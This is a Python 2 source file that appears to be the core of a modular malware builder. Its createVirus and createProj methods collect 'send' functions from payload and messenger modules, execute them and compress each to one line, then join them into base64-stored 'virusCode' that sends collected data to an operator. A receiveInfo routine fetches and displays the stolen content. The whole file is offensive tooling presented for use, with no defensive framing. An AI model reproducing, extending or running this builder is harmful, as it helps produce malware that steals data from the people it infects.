#-*- coding:utf-8 -*-

#Importing libs
import re, os, sys, ast, random, base64, time, json
import astunparse
from lib.ol.main import onelinerize

#Importing terminaltables
try: 
    import terminaltables
except:
    print "Oops"

#Constants
ignoreFiles = [".DS_Store", "__init__.py", "config.py"]
ignoreEnds = ["pyc"]
supportedOS = ["Windows", "Darwin", "Linux"]
dataLoc = "db/data.json"

class utils():
    @staticmethod
    def convertSupportedOS(supportedOS):
        supportedOS = supportedOS.replace(" ", "")\
            .replace('"', '')
        return supportedOS.split(",")

    @classmethod
    def checkFile(cls, fileLines, sender = False):
        _regex = "__%s__.*?=.*?(\'|\")(.*?)(\'|\")"
        _sys = re.compile("__%s__.*?=.*?\[(.*?)\]" % "sys")
        _name = re.compile(_regex % "name")
        _desc = re.compile(_regex % "desc")
        resultTemp = {
            "success": 0,
            "info": "None",
            "sys": "",
            "name": "",
            "desc": "",
            "sendCode": "",
            "sendCodeFunc": "",
            "receiveCode": "",
            "receiveCodeFunc": ""
        }
        for i in enumerate(fileLines):
            if ";" not in i[1]:
                if not resultTemp["sys"]:
                    lineSys = _sys.findall(i[1])
                    if lineSys:
                        resultTemp["sys"] = cls.convertSupportedOS(lineSys[0])
                        continue
                if not resultTemp["name"]:
                    lineName = _name.findall(i[1])
                    if lineName:
                        resultTemp["name"] = lineName[0][1]
                        continue
                if not resultTemp["desc"]:
                    lineDesc = _desc.findall(i[1])
                    if lineDesc:
                        resultTemp["desc"] = lineDesc[0][1]
                        continue
            else:
                trivialResult = cls.checkFile(i[1].split(";"))
                for j in trivialResult:
                    if not resultTemp[j] and trivialResult[j]:
                        resultTemp[j] = trivialResult[j]
        return resultTemp

    @staticmethod
    def checkContent(info, file):
        for i in info["sys"]:
            if i not in supportedOS:
                info["success"] = 1
                info["info"] = "OS not Supported"
                print "[!] OS %s not Supported for file %s" % (i, file)
        for k in info:
            if not info[k] and k in ["sys", "name", "desc"]:
                info["success"] = 2
                info["info"] = k
                print "[!] No %s has been given in file %s" % (info["info"], 
                    file)
        if " " in info["name"]:
            info["success"] = 3
            info["info"] = "Space In Name"
            print "[!] There should be no space in name of %s" % file
        return info

    @staticmethod
    def checkModuleInt(info, file):
        try:
            code = open(file).read()
            for i in ast.walk(ast.parse(code)):
                try:
                    if isinstance(i, ast.FunctionDef):
                        funcCode = astunparse.unparse(i)
                        reSendFunc = re.compile("def.+?send\(")
                        if reSendFunc.findall(funcCode):
                            funcName = 'send%s%s' % (
                                info["name"], str(random.randint(0,2000)))
                            sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
                                funcCode))
                            exec(sendCode)
                            info["sendCode"] = sendCode
                            info["sendCodeFunc"] = funcName
                except:
                    info["success"] = 4
                    info["info"] = "Error"
                    print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
            if info["sendCode"] == "":
                info["success"] = 5
                info["info"] = "No Send Func"
                print "[!] No 'send' function in file %s" % file
        except:
            info["success"] = 4
            info["info"] = "Error"
            print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
        return info

    @classmethod
    def checkModule(cls, info, file):
        return cls.checkContent(
            cls.checkModuleInt(info, file), 
            file)

    @staticmethod
    def checkSendInt(info, file):
        try:
            code = open(file).read()
            for i in ast.walk(ast.parse(code)):
                try:
                    if isinstance(i, ast.FunctionDef):
                        funcCode = astunparse.unparse(i)
                        reSendFunc = re.compile("def.+?send\(")
                        reReceiveFunc = re.compile("def.+?receive\(")
                        if reSendFunc.findall(funcCode):
                            funcName = 'send%s%s' % (
                                info["name"], str(random.randint(0,2000)))
                            sendCode = onelinerize(reSendFunc.sub('def %s(' % funcName,
                                funcCode))
                            exec(sendCode)
                            info["sendCode"] = sendCode
                            info["sendCodeFunc"] = funcName
                        elif reReceiveFunc.findall(funcCode):
                            funcName = 'receive%s%s' % (
                                info["name"], str(random.randint(0,2000)))
                            receiveCode = reReceiveFunc.sub('def %s(' % funcName,
                                funcCode)
                            exec(receiveCode)
                            info["receiveCode"] = receiveCode
                            info["receiveCodeFunc"] = funcName
                except:
                    info["success"] = 4
                    info["info"] = "Error"
                    print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
            if info["sendCode"] == "":
                info["success"] = 5
                info["info"] = "No Send Func"
                print "[!] No 'send' function in file %s" % file
            if info["receiveCode"] == "":
                info["success"] = 5
                info["info"] = "No Receive Func"
                print "[!] No 'receive' function in file %s" % file
        except:
            info["success"] = 4
            info["info"] = "Error"
            print "[x] Error %s in file %s" % (sys.exc_info()[0], file)
        return info

    @classmethod
    def checkSend(cls, info, file):
        return cls.checkContent(
            cls.checkSendInt(info, file), 
            file)

    @staticmethod
    def checkAva(module, info, platform):
        moduleNames = [x["name"] for x in info]
        if module in moduleNames:
            for i in info:
                if i["name"] == module:
                    if i["success"] == 0:
                        if platform in i["sys"]:
                            return True 
                        else:
                            print "[!] Module %s is not supporting %s, ignored" % (
                         	module, platform)
                            return False
                    else:
                        print "[!] Module %s is not available, ignored" % module
                        return False
        print "[!] Module %s is not available, ignored" % module
        return False

    @staticmethod
    def visitJSON():
        try:
            data = json.loads(open(dataLoc).read())
            return data
        except Exception as e:
            print "[x] Error in %s" % dataLoc
            raise e

class API():
    @staticmethod
    def getModuleInfo(path='module'):
        moduleInfo = []
        for dirpath,dirnames,filenames in os.walk(path):
            for file in filenames:
                fullpath = os.path.join(dirpath,file)
                if not (file in ignoreFiles \
                    or file.split(".")[-1] in ignoreEnds):
                    moduleInfo.append(utils.checkModule(
                        utils.checkFile(
                            open(fullpath).readlines()
                        ),fullpath
                    ))
        return moduleInfo

    @staticmethod
    def getSendInfo(path='messenger'):
        sendInfo = []
        for dirpath,dirnames,filenames in os.walk(path):
            for file in filenames:
                fullpath = os.path.join(dirpath,file)
                if not (file in ignoreFiles \
                    or file.split(".")[-1] in ignoreEnds):
                        sendInfo.append(utils.checkSend(
                            utils.checkFile(
                                open(fullpath).readlines()
                            ),fullpath
                        ))
        return sendInfo

    @classmethod
    def createVirus(cls, moduleList, sendList, 
        projName, platform = 'Darwin',
        sendPath = 'messenger',
        modulePath = "module"):
        moduleInfo = cls.getModuleInfo(modulePath)
        sendInfo = cls.getSendInfo(sendPath)
        realModuleList = []
        realSendList = []
        for send in enumerate(sendList):
            if utils.checkAva(send[1], sendInfo, platform):
                for i in sendInfo:
                    if i["name"] == send[1]:
                        realSendList.append(i)
        for module in enumerate(moduleList):
            if utils.checkAva(module[1], moduleInfo, platform):
                for i in moduleInfo:
                    if i["name"] == module[1]:
                        realModuleList.append(i)
        moduleCode = ""
        sendCode = ""
        execCode = ""
        for realModule in realModuleList:
            moduleCode += "%s;" % (realModule["sendCode"])
        for realSend in realSendList:
            sendCode += "%s;" % (realSend["sendCode"])
        for i in realModuleList:
            for j in realSendList:
                execCode += "%s(%s(), '%s', '%s');" % (
                    j["sendCodeFunc"], i["sendCodeFunc"], 
                    i["name"], projName)
        return moduleCode + sendCode + execCode

    @classmethod
    def createReceive(cls, sendList,
        projName, platform = 'Darwin',
        sendPath = 'messenger'):
        sendInfo = cls.getSendInfo(sendPath)
        realSendList = []
        for send in enumerate(sendList):
            if utils.checkAva(send[1], sendInfo, platform):
                for i in sendInfo:
                    if i["name"] == send[1]:
                        realSendList.append(i)
        receiveCode = ""
        execCode = ""
        for realSend in realSendList:
            receiveCode += "%s\n" % (realSend["receiveCode"])
        
        for j in realSendList:
            execCode += "receiveObj = %s(@knicky.RANGE, '%s');" % (
                    j["receiveCodeFunc"], projName
                )
        return receiveCode + execCode

    @classmethod
    def createProj(cls, 
        moduleList, sendList, platform = 'Darwin',
        projName = str(base64.b64encode(str(time.time() + 
            random.randint(0,20000)))).replace("=", ""),
        sendPath = 'messenger',
        modulePath = "module"):
        print "[*] The project name is %s" % projName
        data = utils.visitJSON()
        projects = data["projects"]
        virusCode = cls.createVirus(moduleList, sendList, projName, platform, 
            sendPath, modulePath)
        receiveCode = cls.createReceive(sendList, projName, platform, sendPath)
        projects.append({
            "projName" : projName,
            "virusCode" : base64.b64encode(virusCode),
            "receiveCode" : base64.b64encode(receiveCode),
            "time" : time.time()
        })
        data["projects"] = projects
        with open(dataLoc, "w") as file:
            json.dump(data, file)
        print "[*] Success!!"
        return virusCode

    @staticmethod
    def listProj():
        data = utils.visitJSON()
        result = []
        for i in data["projects"]:
            result.append({
                "name": i["projName"],
                "time": i["time"]
            })
        return result

    @staticmethod
    def getReceiveCode(projName):
        data = utils.visitJSON()
        receiveCode = ""
        for i in data["projects"]:
            if i["projName"] == projName:
                receiveCode = base64.b64decode(i["receiveCode"])
        return receiveCode

    @staticmethod
    def getVirusCode(projName):
        data = utils.visitJSON()
        virusCode = ""
        for i in data["projects"]:
            if i["projName"] == projName:
                virusCode = base64.b64decode(i["virusCode"])
        return virusCode

    @classmethod
    def receiveInfo(cls, projName, _range = 10):
        data = utils.visitJSON()
        receiveCode = cls.getReceiveCode(projName)
        if receiveCode == "":
            print "[x] Your entered wrong project name"
            return []
        else: 
            exec(receiveCode\
                .replace("@knicky.RANGE", str(_range)))
            return receiveObj


class beautify():
    @classmethod
    def getTime(cls, timestamp):
        return time.strftime("%Y-%m-%d %H:%M:%S", 
                    time.localtime(float(timestamp)))

    @classmethod
    def b64(cls, _str):
        return base64.b64decode(_str)

    @classmethod
    def tm(cls, result):
        try:
            return terminaltables.AsciiTable(result).table
        except Exception as e:
            print "Error in terminaltables %s" % e

    @classmethod
    def bM(cls, info):
        result = [["Name", "Description", "SupportedOS", "Status"]]
        for i in info:
            if i["success"] == 0:
                result.append([i["name"], i["desc"], i["sys"], "OK"])
            else:
                result.append(
                    [i["name"], i["desc"], i["sys"], "Failed"]
                )
        return cls.tm(result)

    @classmethod
    def bC(cls, info):
        result = [["Name", "Time"]]
        for i in info:
            result.append([i["name"], cls.getTime(i["time"])])
        return cls.tm(result)

    @classmethod
    def bR(cls, info):
        result = [["Module", "From User", "Date", "Content"]]
        for i in info:
            result.append([i["_byModule"], i["_from"], 
                cls.getTime(i["_date"]), 
                cls.b64(i["_content"])])
        return cls.tm(result)

    @classmethod
    def getModuleInfo(cls, path='module'):
        info = API.getModuleInfo(path)
        return cls.bM(info)

    @classmethod
    def getSendInfo(cls, path='messenger'):
        info = API.getModuleInfo(path)
        return cls.bM(info)

    @classmethod
    def listProj(cls):
        info = API.listProj()
        return cls.bC(info)

    @classmethod
    def receiveInfo(cls, projName, _range = 10):
        info = API.receiveInfo(projName, _range)
        return cls.bR(info)
